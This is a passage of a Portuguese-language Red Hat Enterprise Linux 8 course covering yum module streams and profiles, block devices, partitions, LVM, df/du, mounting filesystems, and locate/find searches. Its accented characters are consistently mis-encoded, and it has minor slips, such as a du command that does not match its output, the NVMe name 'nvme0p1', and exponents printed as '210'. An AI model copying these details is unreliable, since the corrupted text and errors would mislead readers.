O reposit√≥rio AppStream cont√©m dois tipos de conte√∫do: m√≥dulos e pacotes RPM tradicionais. Um m√≥dulo consiste em um conjunto de pacotes RPM que est√£o interligados. Os m√≥dulos podem conter v√°rios fluxos para disponibilizar diversas vers√µes de aplicativos para instala√ß√£o. A ativa√ß√£o de um fluxo de m√≥dulo fornece ao sistema acesso aos pacotes RPM que est√£o nesse fluxo. M√≥dulos
Um m√≥dulo √© um conjunto de pacotes RPM que s√£o um conjunto consistente e est√£o interligados. Normalmente, √© organizado em torno de uma vers√£o espec√≠fica de um aplicativo de software ou linguagem de programa√ß√£o. Um m√≥dulo t√≠pico pode conter pacotes com um aplicativo, pacotes com as bibliotecas de depend√™ncia espec√≠ficas do aplicativo, pacotes com documenta√ß√£o do aplicativo e pacotes com utilit√°rios auxiliares.
Fluxos de m√≥dulos
Cada m√≥dulo pode ter um ou mais fluxos de m√≥dulos, que cont√™m vers√µes diferentes do conte√∫do. Cada um dos fluxos recebe atualiza√ß√µes de forma independente. Pense no fluxo de m√≥dulos como um reposit√≥rio virtual no reposit√≥rio f√≠sico AppStream.
Para cada m√≥dulo, apenas um de seus fluxos pode ser ativado e fornecer seus pacotes.
Perfis de m√≥dulos
Cada m√≥dulo pode ter um ou mais perfis. Um perfil √© uma lista de determinados pacotes a serem instalados juntos para um caso de uso espec√≠fico, como servidor ou cliente ou para desenvolvimento, instala√ß√£o m√≠nima, entre outros.
A instala√ß√£o de um perfil de m√≥dulo espec√≠fico simplesmente instala um conjunto espec√≠fico de pacotes do fluxo do m√≥dulo. Voc√™ pode posteriormente instalar ou desinstalar pacotes normalmente. Se voc√™ n√£o especificar um perfil, o m√≥dulo instalar√° seu perfil padr√£o. Gerenciamento de m√≥dulos usando yum
O yum vers√£o 4, novo no Red Hat Enterprise Linux 8, adiciona suporte para os novos recursos modulares do fluxo de aplicativos.
Para lidar com o conte√∫do modular, o comando yum module foi adicionado. De outra forma, o yum funciona com m√≥dulos assim como com pacotes regulares.
Lista de m√≥dulos
Para exibir a lista de m√≥dulos dispon√≠veis, use yum module list:
[user@host ~]$ yum module list Red Hat Enterprise Linux 8 for x86_64 - AppStream (RPMs) Name Stream Profiles Summary 389-ds 1.4 default 389 Directory Server (base) ant 1.10 [d] common [d] Java build tool container-tools 1.0 [d] common [d] Common tools and dependencies for container runtimes &amp;hellip;output omitted&amp;hellip; Hint: [d]efault, [e]nabled, [x]disabled, [i]nstalled
Nota
Use a op√ß√£o Hint no final da sa√≠da para ajudar a determinar quais fluxos e perfis est√£o ativados, desativados, instalados e quais deles s√£o as op√ß√µes padr√£o.
Para listar os fluxos de um m√≥dulo espec√≠fico e recuperar o status:
[user@host ~]$ yum module list perl Red Hat Enterprise Linux 8 for x86_64 - AppStream (RPMs) Name Stream Profiles Summary perl 5.24 common [d], minimal Practical Extraction and Report Language perl 5.26 [d] common [d], minimal Practical Extraction and Report Language
Para exibir detalhes de um m√≥dulo:
[user@host ~]$ yum module info perl Name : perl Stream : 5.24 Version : 820190207164249 Context : ee766497 Profiles : common [d], minimal Default profiles : common Repo : rhel-8-for-x86_64-appstream-rpms Summary : Practical Extraction and Report Language &amp;hellip;output omitted&amp;hellip; Artifacts : perl-4:5.24.4-403.module&#43;el8&#43;2770&#43;c759b41a.x86_64 : perl-Algorithm-Diff-0:1.1903-9.module&#43;el8&#43;2464&#43;d274aed1.noarch : perl-Archive-Tar-0:2.30-1.module&#43;el8&#43;2464&#43;d274aed1.noarch &amp;hellip;output omitted&amp;hellip;
Nota
Se o fluxo de m√≥dulos n√£o for especificado, yum module info mostra uma lista dos pacotes instalados pelo perfil padr√£o de um m√≥dulo usando o fluxo padr√£o. Use o formato nome-do-m√≥dulo:fluxo para visualizar um fluxo de m√≥dulos espec√≠fico. Adicione a op√ß√£o &amp;ndash;profile para exibir informa√ß√µes sobre os pacotes instalados por cada um dos perfis do m√≥dulo. Por exemplo:
[user@host ~]$ yum module info &amp;ndash;profile perl:5.24
Ativa√ß√£o de fluxos de m√≥dulos e instala√ß√£o de m√≥dulos
Os fluxos de m√≥dulos devem estar ativados para instalar o m√≥dulo correspondente. Para simplificar esse processo, quando um m√≥dulo √© instalado, ele ativa seu fluxo de m√≥dulo se necess√°rio. Os fluxos de m√≥dulos podem ser ativados manualmente usando yum module enable e fornecendo o nome do fluxo de m√≥dulo. Importante
Apenas um fluxo de m√≥dulo pode ser ativado para um determinado m√≥dulo. Ativar um fluxo de m√≥dulo adicional desativar√° o fluxo de m√≥dulo original.
Instale um m√≥dulo usando o fluxo e os perfis padr√£o:
[user@host ~]$ sudo yum module install perl Dependencies resolved. Package Arch Version Repository Size Installing group/module packages: perl x86_64 4:5.26.3-416.el8 rhel-8-for-x86_64-appstream-htb-rpms 72 k Installing dependencies: &amp;hellip;output omitted&amp;hellip; Running transaction Preparing : 1/1 Installing : perl-Exporter-5.72-396.el8.noarch 1/155 Installing : perl-Carp-1.42-396.el8.noarch 2/155 &amp;hellip;output omitted&amp;hellip; Installed: perl-4:5.26.3-416.el8.x86_64 perl-Encode-Locale-1.05-9.el8.noarch &amp;hellip;output omitted&amp;hellip; Complete!
Nota
Os mesmos resultados poderiam ter sido obtidos executando yum install @perl. A nota√ß√£o @ informa ao yum que o argumento √© um nome de m√≥dulo em vez de um nome de pacote.
Para verificar o status do fluxo de m√≥dulo e do perfil instalado:
[user@host ~]$ yum module list perl Red Hat Enterprise Linux 8 for x86_64 - AppStream (RPMs) Name Stream Profiles Summary perl 5.24 common, minimal Practical Extraction and Report Language perl 5.26 [d][e] common [i], minimal Practical Extraction and Report Language
Hint: [d]efault, [e]nabled, [x]disabled, [i]nstalled
Remo√ß√£o de m√≥dulos e desativa√ß√£o de fluxos de m√≥dulos
A remo√ß√£o de um m√≥dulo exclui todos os pacotes instalados pelos perfis do fluxo de m√≥dulo ativado no momento e todos os demais pacotes e m√≥dulos que dependem deles. Os pacotes instalados com esse fluxo de m√≥dulos n√£o listado em nenhum de seus perfis permanecem instalados no sistema e podem ser removidos manualmente. Aten√ß√£o
Remover m√≥dulos e alternar fluxos de m√≥dulos pode ser um pouco complicado. Alternar o fluxo ativado para um m√≥dulo √© equivalente a redefinir o fluxo atual e ativar o novo fluxo. Isso n√£o altera automaticamente nenhum pacote instalado. Voc√™ tem que fazer isso manualmente.
A instala√ß√£o direta de um fluxo de m√≥dulos diferente do que est√° atualmente instalado n√£o √© recomendada, porque os scripts de upgrade podem ser executados durante a instala√ß√£o, o que romperia o fluxo do m√≥dulo original. Isso pode levar √† perda de dados ou outros problemas de configura√ß√£o.
Prossiga com cuidado.
Para remover um m√≥dulo instalado:
[user@host ~]$ sudo yum module remove perl Dependencies resolved. Package ArchVersion Repository Size Removing: perl x86_644:5.26.3-416.el8 @rhel-8.0-for-x86_64-appstream-rpms 0 Removing unused dependencies: &amp;hellip;output omitted&amp;hellip; Running transaction Preparing : 1/1 Erasing : perl-4:5.26.3-416.el8.x86_64 1/155 Erasing : perl-CPAN-2.18-397.el8.noarch 2/155 &amp;hellip;output omitted&amp;hellip; Removed: perl-4:5.26.3-416.el8.x86_64 dwz-0.12-9.el8.x86_64 &amp;hellip;output omitted&amp;hellip; Complete!
Depois que o m√≥dulo for removido, o fluxo de m√≥dulo ainda estar√° ativado. Para verificar se o fluxo de m√≥dulo ainda est√° ativado:
[user@host ~]$ yum module list perl Red Hat Enterprise Linux 8 for x86_64 - AppStream (RPMs) Name Stream Profiles Summary perl 5.24 common [d], minimal Practical Extraction and Report Language perl 5.26 [d][e] common [d], minimal Practical Extraction and Report Language
Hint: [d]efault, [e]nabled, [x]disabled, [i]nstalled
Para desativar o fluxo de m√≥dulo:
[user@host ~]$ sudo yum module disable perl &amp;hellip;output omitted&amp;hellip; Dependencies resolved. Package Arch Version Repository Size Disabling module streams: perl 5.26 Is this ok [y/N]: y Complete!
Troca de fluxos de m√≥dulos
Normalmente, a troca de fluxos de m√≥dulos exige a atualiza√ß√£o ou o downgrade do conte√∫do para uma vers√£o diferente.
Para garantir uma troca limpa, voc√™ deve remover os m√≥dulos fornecidos pelo fluxo do m√≥dulo primeiro. Dessa forma, ser√£o removidos todos os pacotes instalados pelos perfis do m√≥dulo e os m√≥dulos e pacotes nos quais esses pacotes tenham depend√™ncias.
Para listar os pacotes instalados com o m√≥dulo, no exemplo abaixo o m√≥dulo postgresql:9.6 est√° instalado:
[user@host ~]$ sudo yum module info postgresql | grep module&#43;el8 | sed &amp;rsquo;s/.*: //g;s/\n/ /g&amp;rsquo; | xargs yum list installed Installed Packages postgresql.x86_64 9.6.10-1.module&#43;el8&#43;2470&#43;d1bafa0e @rhel-8.0-for-x86_64-appstream-rpms postgresql-server.x86_64 9.6.10-1.module&#43;el8&#43;2470&#43;d1bafa0e @rhel-8.0-for-x86_64-appstream-rpms
Remova os pacotes listados no comando anterior. Marque os perfis do m√≥dulo a serem desinstalados.
[user@host ~]$ sudo yum module remove postgresql &amp;hellip;output omitted&amp;hellip; Is this ok [y/N]: y &amp;hellip;output omitted&amp;hellip; Removed: postgresql-server-9.6.10-1.module&#43;el8&#43;2470&#43;d1bafa0e.x86_64 libpq-10.5-1.el8.x86_64 postgresql-9.6.10-1.module&#43;el8&#43;2470&#43;d1bafa0e.x86_64 Complete
Depois de remover os perfis do m√≥dulo, reinicie o fluxo do m√≥dulo. Use o comando yum module reset para redefinir o fluxo do m√≥dulo.
[user@host ~]$ sudo yum module reset postgresql Package Arch Version Repository Size Resetting module streams: postgresql 9.6
Transaction Summary Is this ok [y/N]: y Complete!
Para ativar um fluxo de m√≥dulo diferente e instalar o m√≥dulo:
[user@host ~]$ sudo yum module install postgresql:10
O novo fluxo de m√≥dulo ser√° ativado e o fluxo atual ser√° desativado. Talvez seja necess√°rio atualizar ou fazer downgrade de pacotes do fluxo de m√≥dulo anterior que n√£o est√£o listados no novo perfil. Use yum distro-sync para executar essa tarefa se necess√°rio. Tamb√©m pode haver pacotes do fluxo de m√≥dulo anterior que continuam instalados. Remova-os usando yum remove.
Cap√≠tulo 15. Acesso a sistemas de arquivos Linux Identifica√ß√£o de sistemas de arquivos e dispositivos Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de identificar um diret√≥rio na hierarquia do sistema de arquivos e em que dispositivo ele est√° armazenado. Conceitos de gerenciamento de armazenamento
Os arquivos em um servidor Linux s√£o acessados pela hierarquia do sistema de arquivos, uma √∫nica √°rvore invertida de diret√≥rios. Essa hierarquia do sistema de arquivos √© montada a partir dos sistemas de arquivos fornecidos pelos dispositivos de armazenamento dispon√≠veis para o sistema. Cada sistema de arquivos √© um dispositivo de armazenamento que foi formatado para armazenar arquivos.
De certo modo, a hierarquia de sistema de arquivos do Linux apresenta uma cole√ß√£o de sistemas de arquivos em dispositivos de armazenamento separados, como se fosse um conjunto de arquivos em um dispositivo de armazenamento gigante que voc√™ pode navegar. Na maior parte do tempo, voc√™ n√£o precisa saber em qual dispositivo de armazenamento um arquivo espec√≠fico est√°, basta saber o diret√≥rio em que o arquivo est√°.
√Äs vezes, no entanto, isso pode ser importante. Pode ser necess√°rio determinar o tamanho de um dispositivo de armazenamento e quais diret√≥rios na hierarquia de sistema de arquivos s√£o afetados. Pode haver erros nos logs de um dispositivo de armazenamento, e voc√™ precisa saber quais sistemas de arquivos est√£o em risco. Voc√™ pode apenas querer criar um link f√≠sico entre dois arquivos, e voc√™ precisa saber se eles est√£o no mesmo sistema de arquivos para determinar se √© poss√≠vel.
Sistemas de arquivos e pontos de montagem
Para disponibilizar o conte√∫do de um sistema de arquivos na hierarquia de sistema de arquivos, ele deve ser montado em um diret√≥rio vazio. Esse diret√≥rio √© chamado de ponto de montagem. Uma vez montado, se voc√™ usar ls para listar esse diret√≥rio, voc√™ ver√° o conte√∫do do sistema de arquivos montado e poder√° acessar e usar esses arquivos normalmente. Muitos sistemas de arquivos s√£o montados automaticamente como parte do processo do boot.
Se voc√™ trabalhou apenas com as letras de unidades do Microsoft Windows, esse √© um conceito fundamentalmente diferente. √â um pouco semelhante ao recurso de pastas montadas do NTFS.
Sistemas de arquivos, armazenamento e dispositivos de blocos
O acesso de baixo n√≠vel a dispositivos de armazenamento no Linux √© fornecido por um tipo especial de arquivo chamado dispositivo de blocos. Esses dispositivos de blocos devem ser formatados com um sistema de arquivos antes de poderem ser montados.
Os arquivos de dispositivo de blocos s√£o armazenados no diret√≥rio /dev, juntamente com outros arquivos de dispositivo. Os arquivos de dispositivo s√£o criados automaticamente pelo sistema operacional. No Red Hat Enterprise Linux, o primeiro disco r√≠gido SATA/PATA, SAS, SCSI ou USB detectado √© chamado /dev/sda, o segundo √© /dev/sdb e assim por diante. Esses nomes representam o disco r√≠gido inteiro.
Outros tipos de armazenamento ter√£o outras formas de nomenclatura.
Tabela 15.1. Nomenclatura do dispositivo de blocos
nav_linux_1.png
Nota
Muitas m√°quinas virtuais usam o mais recente armazenamento paravirtualizado virtio-scsi que ter√° nomenclatura no estilo /dev/sd*.
Parti√ß√µes de disco
Normalmente, voc√™ n√£o transforma todo o dispositivo de armazenamento em um sistema de arquivos. Geralmente, os dispositivos de armazenamento s√£o divididos em partes menores chamadas de parti√ß√µes.
As parti√ß√µes permitem que voc√™ compartimentalize um disco: as diversas parti√ß√µes podem ser formatadas com diferentes sistemas de arquivos ou usadas para diferentes finalidades. Por exemplo, uma parti√ß√£o pode conter os diret√≥rios pessoais do usu√°rio, enquanto outra pode conter os dados e logs do sistema. Se um usu√°rio preencher a parti√ß√£o do diret√≥rio pessoal com dados, a parti√ß√£o do sistema ainda poder√° ter espa√ßo dispon√≠vel.
As parti√ß√µes s√£o dispositivos de blocos em si. Em armazenamento conectado a SATA, a primeira parti√ß√£o no primeiro disco √© /dev/sda1. A terceira parti√ß√£o no segundo disco √© /dev/sdb3 e assim por diante. Dispositivos de armazenamento paravirtualizados possuem um sistema de nomenclatura semelhante.
Um dispositivo SSD conectado a NVMe nomeia suas parti√ß√µes de maneira diferente. Nesse caso, a primeira parti√ß√£o no primeiro disco √© /dev/nvme0p1. A terceira parti√ß√£o no segundo disco √© /dev/nvme1p3 e assim por diante. Os cart√µes SD ou MMC possuem um sistema de nomenclatura semelhante.
Uma listagem longa do arquivo de dispositivos de /dev/sda1 no host revela seu tipo de arquivo especial como b, que significa &amp;ldquo;dispositivo de blocos&amp;rdquo;:
[user@host ~]$ ls -l /dev/sda1 brw-rw&amp;mdash;-. 1 root disk 8, 1 Feb 22 08:00 /dev/sda1
Volumes l√≥gicos
Outra maneira de organizar discos e parti√ß√µes √© com o gerenciamento de volume l√≥gico (LVM). Com o LVM, um ou mais dispositivos de blocos podem ser agregados em um pool de armazenamento chamado de grupo de volumes. O espa√ßo em disco no grupo de volumes √© dividido entre um ou mais volumes l√≥gicos, que s√£o o equivalente funcional de uma parti√ß√£o que reside em um disco f√≠sico.
O sistema de LVM atribui nomes a grupos de volumes e volumes l√≥gicos na cria√ß√£o. O LVM cria um diret√≥rio em /dev que corresponde ao nome do grupo e, em seguida, cria um link simb√≥lico nesse novo diret√≥rio com o mesmo nome do volume l√≥gico. Esse arquivo de volume l√≥gico fica dispon√≠vel para montagem. Por exemplo, se um grupo de volumes for chamado de myvg e o volume l√≥gico dentro dele for chamado de mylv, o nome do caminho completo para o arquivo do dispositivo de volume l√≥gico ser√° /dev/myvg/mylv. Nota
A forma do nome do dispositivo de volume l√≥gico mencionado acima √©, na verdade, implementada como um link simb√≥lico para o arquivo de dispositivo real usado para acess√°-lo, o que pode variar entre os boots. H√° outra forma de nome de dispositivo de volume l√≥gico vinculada a arquivos em /dev/mapper que s√£o frequentemente usados e tamb√©m s√£o links simb√≥licos para o arquivo de dispositivo real. Verifica√ß√£o de sistemas de arquivos
Para obter uma vis√£o geral dos dispositivos dos sistemas de arquivos locais e remotos e da quantidade de espa√ßo livre dispon√≠vel, execute o comando df. Quando df √© executado sem argumentos, ele informa o espa√ßo em disco total, o espa√ßo em disco utilizado, o espa√ßo em disco livre e a porcentagem do total de espa√ßo em disco usado em todos os sistemas de arquivos normais montados. Ele fornece informa√ß√µes sobre os sistemas de arquivos locais e remotos.
O exemplo a seguir exibe os sistemas de arquivos e os pontos de montagem do host.
[user@host ~]$ df Filesystem 1K-blocks Used Available Use% Mounted on devtmpfs 912584 0 912584 0% /dev tmpfs 936516 0 936516 0% /dev/shm tmpfs 936516 16812 919704 2% /run tmpfs 936516 0 936516 0% /sys/fs/cgroup /dev/vda3 8377344 1411332 6966012 17% / /dev/vda1 1038336 169896 868440 17% /boot tmpfs 187300 0 187300 0% /run/user/1000
O particionamento no sistema host mostra dois sistemas de arquivos f√≠sicos, que s√£o montados em / e /boot. Isso √© comum para m√°quinas virtuais. Os dispositivos tmpfs e devtmpfs s√£o sistemas de arquivos na mem√≥ria do sistema. Todos os arquivos gravados em tmpfs ou em devtmpfs desaparecer√£o ap√≥s a reinicializa√ß√£o do sistema.
Para melhorar a legibilidade dos tamanhos da sa√≠da, existem duas op√ß√µes leg√≠veis diferentes: -h ou -H. A diferen√ßa entre essas duas op√ß√µes √© que -h informa em KiB (210), MiB (220) ou GiB (230), enquanto a op√ß√£o -H informa em unidades do SI: KB (103), MB (106) ou GB (109). Os fabricantes de discos r√≠gidos geralmente usam unidades SI ao anunciar seus produtos.
Mostre um relat√≥rio sobre os sistemas de arquivos no sistema host com todas as unidades convertidas para formato leg√≠vel:
[user@host ~]$ df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 892M 0 892M 0% /dev tmpfs 915M 0 915M 0% /dev/shm tmpfs 915M 17M 899M 2% /run tmpfs 915M 0 915M 0% /sys/fs/cgroup /dev/vda3 8.0G 1.4G 6.7G 17% / /dev/vda1 1014M 166M 849M 17% /boot tmpfs 183M 0 183M 0% /run/user/1000
Para obter informa√ß√µes mais detalhadas sobre o espa√ßo usado por uma determinada √°rvore de diret√≥rios, use o comando du. O comando du tem as op√ß√µes -h e -H para converter a sa√≠da em formato leg√≠vel. O comando du mostra o tamanho de todos os arquivos na √°rvore de diret√≥rios atual de modo recursivo.
Mostre um relat√≥rio de uso do disco para o diret√≥rio /usr/share no host:
[root@host ~]# du /usr/share &amp;hellip;output omitted&amp;hellip; 176 /usr/share/smartmontools 184 /usr/share/nano 8 /usr/share/cmake/bash-completion 8 /usr/share/cmake 356676 /usr/share
Mostre um relat√≥rio de uso do disco em formato leg√≠vel para o diret√≥rio /usr/share no host:
[root@host ~]# du -h /var/log &amp;hellip;output omitted&amp;hellip; 176K /usr/share/smartmontools 184K /usr/share/nano 8.0K /usr/share/cmake/bash-completion 8.0K /usr/share/cmake 369M /usr/share
Montagem e desmontagem de sistemas de arquivos Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de acessar o conte√∫do dos sistemas de arquivos adicionando e removendo sistemas de arquivos da hierarquia de sistemas de arquivos. Montagem manual de sistemas de arquivos
Um sistema de arquivos que resida em um dispositivo de armazenamento remov√≠vel precisa ser montado para poder acess√°-lo. O comando mount permite que o usu√°rio root monte manualmente um sistema de arquivos. O primeiro argumento do comando mount especifica o sistema de arquivos a ser montado. O segundo argumento especifica o diret√≥rio a ser usado como ponto de montagem na hierarquia do sistema de arquivos.
Existem duas maneiras comuns de especificar o sistema de arquivos em uma parti√ß√£o de disco para o comando mount:
Com o nome do arquivo do dispositivo em /dev contendo o sistema de arquivos. Com a UUID gravada no sistema de arquivos, um identificador universalmente √∫nico. A montagem de um dispositivo √© relativamente simples. Voc√™ precisa identificar o dispositivo que deseja montar, verificar se o ponto de montagem existe e montar o dispositivo no ponto de montagem.
Identifica√ß√£o do dispositivo de blocos
Um dispositivo de armazenamento conect√°vel a quente, seja uma unidade de disco r√≠gido (HDD), um dispositivo de estado s√≥lido (SSD) ou um dispositivo de armazenamento USB, esses dispositivos poder√£o ser conectados a portas diferentes toda vez que forem conectados a um sistema.
Use o comando lsblk para listar os detalhes de um determinado dispositivo de blocos ou de todos os dispositivos dispon√≠veis.
[root@host ~]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT vda 253:0 0 12G 0 disk ‚îú‚îÄvda1 253:1 0 1G 0 part /boot ‚îú‚îÄvda2 253:2 0 1G 0 part [SWAP] ‚îî‚îÄvda3 253:3 0 11G 0 part / vdb 253:16 0 64G 0 disk ‚îî‚îÄvdb1 253:17 0 64G 0 part
Se voc√™ acabou de adicionar um dispositivo de armazenamento de 64 GB com uma parti√ß√£o, ent√£o voc√™ pode adivinhar pela sa√≠da anterior que /dev/vdb1 √© a parti√ß√£o que voc√™ deseja montar.
Montagem por nome de dispositivo de blocos
O exemplo a seguir monta o sistema de arquivos na parti√ß√£o /dev/vdb1 no diret√≥rio /mnt/data.
[root@host ~]# mount /dev/vdb1 /mnt/data
Para montar um sistema de arquivos, o diret√≥rio de destino j√° deve existir. O diret√≥rio /mnt existe por padr√£o e √© destinado para uso como um ponto de montagem tempor√°rio.
Voc√™ pode usar o diret√≥rio /mnt ou, melhor ainda, criar um subdiret√≥rio de /mnt para usar como um ponto de montagem tempor√°rio, a menos que voc√™ tenha um bom motivo para mont√°-lo em um local espec√≠fico na hierarquia do sistema de arquivos. Importante
Se o diret√≥rio que atua como ponto de montagem n√£o estiver vazio, os arquivos copiados para esse diret√≥rio antes de o sistema de arquivos ser montado n√£o estar√£o acess√≠veis at√© que o sistema de arquivos seja desmontado novamente.
Essa abordagem funciona bem no curto prazo. No entanto, a ordem na qual o sistema operacional detecta os discos pode mudar se os dispositivos forem adicionados ou removidos do sistema. Isso mudar√° o nome do dispositivo associado a esse dispositivo de armazenamento. Uma abordagem melhor seria montar por alguma caracter√≠stica incorporada no sistema de arquivos.
Montagem por UUID de sistema de arquivos
Um identificador est√°vel associado a um sistema de arquivos √© sua UUID, um n√∫mero hexadecimal muito longo que atua como um identificador universalmente √∫nico. Essa UUID √© parte do sistema de arquivos e permanece a mesma desde que o sistema de arquivos n√£o seja recriado.
O comando lsblk -fp lista o caminho completo do dispositivo, com as UUIDs e os pontos de montagem, bem como o tipo de sistema de arquivos na parti√ß√£o. Se o sistema de arquivos n√£o estiver montado, o ponto de montagem ficar√° em branco.
[root@host ~]# lsblk -fp NAME FSTYPE LABEL UUID MOUNTPOINT /dev/vda ‚îú‚îÄ/dev/vda1 xfs 23ea8803-a396-494a-8e95-1538a53b821c /boot ‚îú‚îÄ/dev/vda2 swap cdf61ded-534c-4bd6-b458-cab18b1a72ea [SWAP] ‚îî‚îÄ/dev/vda3 xfs 44330f15-2f9d-4745-ae2e-20844f22762d / /dev/vdb ‚îî‚îÄ/dev/vdb1 xfs 46f543fd-78c9-4526-a857-244811be2d88
Monte o sistema de arquivos pela UUID do sistema de arquivos.
[root@host ~]# mount UUID=&amp;ldquo;46f543fd-78c9-4526-a857-244811be2d88&amp;rdquo; /mnt/data
Montagem autom√°tica de dispositivos de armazenamento remov√≠veis
Se voc√™ estiver conectado e usando o ambiente de √°rea de trabalho gr√°fica, ela montar√° automaticamente qualquer m√≠dia de armazenamento remov√≠vel quando ela for inserida.
O dispositivo de armazenamento remov√≠vel √© montado em /run/media/USERNAME/LABEL, onde USERNAME √© o nome do usu√°rio que fez login no ambiente gr√°fico e LABEL √© um identificador, normalmente, o nome dado ao sistema de arquivos quando ele foi criado se um estava dispon√≠vel.
Antes de remover o dispositivo, voc√™ deve desmont√°-lo manualmente. Desmontagem de sistemas de arquivos
Os procedimentos de desligamento e reinicializa√ß√£o desmontam todos os sistemas de arquivos automaticamente. Como parte desse processo, todos os dados do sistema de arquivos armazenados em cache na mem√≥ria s√£o liberados para o dispositivo de armazenamento, garantindo, assim, que os dados n√£o sejam corrompidos no sistema de arquivos. Aten√ß√£o
Os dados do sistema de arquivos costumam ser armazenados em cache na mem√≥ria. Portanto, para n√£o corromper os dados no disco, √© fundamental que voc√™ desmonte as unidades remov√≠veis antes de desconect√°-las. O procedimento de desmontagem sincroniza os dados antes de liberar a unidade, garantindo a integridade dos dados.
Para desmontar um sistema de arquivos, o comando umount espera o ponto de montagem como argumento.
[root@host ~]# umount /mnt/data
N√£o ser√° poss√≠vel fazer a desmontagem se o sistema de arquivos montado estiver em uso. Para que o comando umount obtenha √™xito, √© necess√°rio que todos os processos parem de acessar os dados do ponto de montagem.
No exemplo abaixo, o comando umount falha porque o sistema de arquivos est√° em uso (o shell est√° usando /mnt/data como diret√≥rio de trabalho atual), gerando uma mensagem de erro.
[root@host ~]# cd /mnt/data [root@host data]# umount /mnt/data umount: /mnt/data: target is busy.
O comando lsof lista todos os arquivos abertos e o processo que os est√° acessando no diret√≥rio especificado. Ele √© √∫til para identificar quais s√£o os processos que est√£o atualmente impedindo o sistema de arquivos de obter √™xito na desmontagem.
[root@host data]# lsof /mnt/data COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME bash 1593 root cwd DIR 253,17 6 128 /mnt/data lsof 2532 root cwd DIR 253,17 19 128 /mnt/data lsof 2533 root cwd DIR 253,17 19 128 /mnt/data
Depois que os processos forem identificados, uma a√ß√£o poder√° ser realizada, como aguardar que o processo seja conclu√≠do ou enviar um sinal SIGTERM ou SIGKILL para o processo. Nesse caso, basta alterar o diret√≥rio de trabalho atual para um diret√≥rio fora do ponto de montagem.
[root@host data]# cd [root@host ~]# umount /mnt/data
Nota
Um motivo comum para a falha na desmontagem dos sistemas de arquivos √© que um shell Bash est√° usando o ponto de montagem ou um subdiret√≥rio como diret√≥rio de trabalho atual. Use o comando cd para alterar o sistema de arquivos a fim de resolver esse problema.
Localiza√ß√£o de arquivos no sistema Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de procurar arquivos em sistemas de arquivos montados usando find e locate. Pesquisa de arquivos
Um administrador de sistema precisa de ferramentas para procurar arquivos que correspondam a determinados crit√©rios no sistema de arquivos. Esta se√ß√£o aborda dois comandos que podem pesquisar arquivos na hierarquia do sistema de arquivos.
O comando locate procura um √≠ndice pr√©-gerado de nomes de arquivos ou caminhos de arquivos e retorna os resultados instantaneamente. O comando find faz uma busca em tempo real por arquivos, rastreando a hierarquia do sistema de arquivos. Localiza√ß√£o de arquivos por nome
O comando locate localiza arquivos com base no nome ou caminho para o arquivo. √â r√°pido porque procura essa informa√ß√µes no banco de dados mlocate. No entanto, esse banco de dados n√£o √© atualizado em tempo real e deve ser atualizado com frequ√™ncia para que os resultados sejam precisos. Isso tamb√©m significa que locate n√£o encontrar√° arquivos que foram criados desde a √∫ltima atualiza√ß√£o do banco de dados.
O banco de dados de locate √© atualizado automaticamente todos os dias. No entanto, a qualquer momento, o usu√°rio root pode usar o comando updatedb para for√ßar uma atualiza√ß√£o imediata.
[root@host ~]# updatedb
O comando locate restringe os resultados para usu√°rios sem privil√©gios. Para ver o nome do arquivo resultante, o usu√°rio deve ter permiss√£o de pesquisa no diret√≥rio em que o arquivo reside.
Procure arquivos com passwd no nome ou no caminho das √°rvores de diret√≥rios leg√≠veis para user no host.
[user@host ~]$ locate passwd /etc/passwd /etc/passwd- /etc/pam.d/passwd /etc/security/opasswd /usr/bin/gpasswd /usr/bin/grub2-mkpasswd-pbkdf2 /usr/bin/lppasswd /usr/bin/passwd &amp;hellip;output omitted&amp;hellip;
Os resultados ser√£o retornados mesmo quando o nome ou o caminho de arquivo for apenas uma correspond√™ncia parcial da pesquisa.
[root@host ~]# locate image /etc/selinux/targeted/contexts/virtual_image_context /usr/bin/grub2-mkimage /usr/lib/sysimage /usr/lib/dracut/dracut.conf.d/02-generic-image.conf /usr/lib/firewalld/services/ovirt-imageio.xml /usr/lib/grub/i386-pc/lnxboot.image &amp;hellip;output omitted&amp;hellip;
A op√ß√£o -i realiza uma pesquisa que n√£o diferencia mai√∫sculas e min√∫sculas. Com essa op√ß√£o, todas as combina√ß√µes poss√≠veis de letras mai√∫sculas e min√∫sculas correspondem √† pesquisa.
[user@host ~]$ locate -i messages &amp;hellip;output omitted&amp;hellip; /usr/share/vim/vim80/lang/zh_TW/LC_MESSAGES /usr/share/vim/vim80/lang/zh_TW/LC_MESSAGES/vim.mo /usr/share/vim/vim80/lang/zh_TW.UTF-8/LC_MESSAGES /usr/share/vim/vim80/lang/zh_TW.UTF-8/LC_MESSAGES/vim.mo /usr/share/vim/vim80/syntax/messages.vim /usr/share/vim/vim80/syntax/msmessages.vim /var/log/messages
A op√ß√£o -n limita o n√∫mero de resultados da pesquisa retornados pelo comando locate. O seguinte exemplo limita os resultados da pesquisa retornados por locate √†s cinco primeiras ocorr√™ncias:
[user@host ~]$ locate -n 5 snow.png /usr/share/icons/HighContrast/16x16/status/weather-snow.png /usr/share/icons/HighContrast/22x22/status/weather-snow.png /usr/share/icons/HighContrast/24x24/status/weather-snow.png /usr/share/icons/HighContrast/256x256/status/weather-snow.png /usr/share/icons/HighContrast/32x32/status/weather-snow.png
Pesquisa de arquivos em tempo real
O comando find localiza os arquivos, executando uma pesquisa em tempo real na hierarquia de sistema de arquivos. √â mais lento que locate, mas mais preciso. Ele tamb√©m pode procurar arquivos com base em crit√©rios diferentes do nome do arquivo, como as permiss√µes do arquivo, o tipo de arquivo, seu tamanho ou sua hora de modifica√ß√£o.
O comando find examina os arquivos do sistema de arquivos usando a conta de usu√°rio que executou a pesquisa. O usu√°rio que invocar o comando find deve ter permiss√£o de leitura e execu√ß√£o em um diret√≥rio para examinar o respectivo conte√∫do.
O primeiro argumento do comando find √© o diret√≥rio a ser pesquisado. Se o argumento do diret√≥rio for omitido, find iniciar√° a pesquisa no diret√≥rio atual e procurar√° correspond√™ncias em todos os subdiret√≥rios.
Para procurar arquivos pelo nome, use a op√ß√£o -name FILENAME. Com ela, find retorna o caminho dos arquivos que correspondem exatamente ao NOME DO ARQUIVO. Por exemplo, para procurar arquivos com o nome sshd_config a partir do diret√≥rio /, execute o seguinte comando:
